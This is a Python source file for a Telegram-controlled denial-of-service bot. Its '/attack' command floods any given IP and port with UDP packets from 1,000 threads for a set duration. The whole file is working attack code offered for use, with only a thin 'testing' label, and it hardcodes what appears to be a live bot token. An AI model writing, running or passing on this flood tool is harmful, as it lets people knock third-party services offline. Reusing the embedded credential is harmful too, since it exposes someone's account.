import telebot
import socket
import random
import time
import re
import threading
from random import choice, randint

# --- Configuration ---
BOT_TOKEN = "7149714912:AAFDri0PhxEQoHtv3nW-YEq115PVeMVrLrI"
ADMIN_ID = 5879540185
FILE_NAME = "ua.txt"
MAX_THREADS = 1000 

bot = telebot.TeleBot(BOT_TOKEN)

def add_useragent():
    """Reads and cleans User-Agents from your ua.txt file."""
    try:
        with open(f"./{FILE_NAME}", "r", encoding='utf-8') as fp:
            uagents = re.findall(r"(.+)\n", fp.read())
            if not uagents:
                return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
            return uagents
    except Exception:
        return ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]

def generate_l4_payload(target_ip, uagents):
    """Creates a randomized Layer 4 UDP payload."""
    random_path = f"/{randint(1, 9999999)}?q={randint(1, 999999)}"
    payload = (
        f"GET {random_path} HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: {choice(uagents)}\r\n"
        f"Accept: */*\r\n"
        f"Connection: keep-alive\r\n"
        f"Content-Length: {randint(10, 100)}\r\n\r\n"
        f"{random._urandom(32).hex()}" 
    ).encode('utf-8')
    return payload

def run_udp_l4_flood(target_ip, target_port, duration, uagents):
    """The High-Speed UDP L4 Flood Loop."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload_pool = [generate_l4_payload(target_ip, uagents) for _ in range(50)]
    end_time = time.time() + duration
    
    while time.time() < end_time:
        try:
            pkt = choice(payload_pool)
            sock.sendto(pkt, (target_ip, target_port))
        except Exception:
            continue
    sock.close()

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id == ADMIN_ID:
        bot.reply_to(message, "✅ **Bot is Online**\nReady for L4 UDP Testing.")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    if message.from_user.id != ADMIN_ID:
        return

    try:
        args = message.text.split()
        if len(args) != 4:
            bot.reply_to(message, "⚠️ **Usage:** `/attack <ip> <port> <time>`")
            return

        target_ip = args[1]
        target_port = int(args[2])
        duration = int(args[3])
        uagents = add_useragent()
        
        bot.reply_to(message, 
            f"🚀 **L4 ATTACK LAUNCHED**\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"🕒 Duration: `{duration}s`\n"
            f"🧵 Threads: `{MAX_THREADS}`")

        for _ in range(MAX_THREADS):
            t = threading.Thread(target=run_udp_l4_flood, args=(target_ip, target_port, duration, uagents))
            t.daemon = True
            t.start()

    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** {str(e)}")

if __name__ == "__main__":
    print("Bot is listening for commands...")
    bot.infinity_polling()
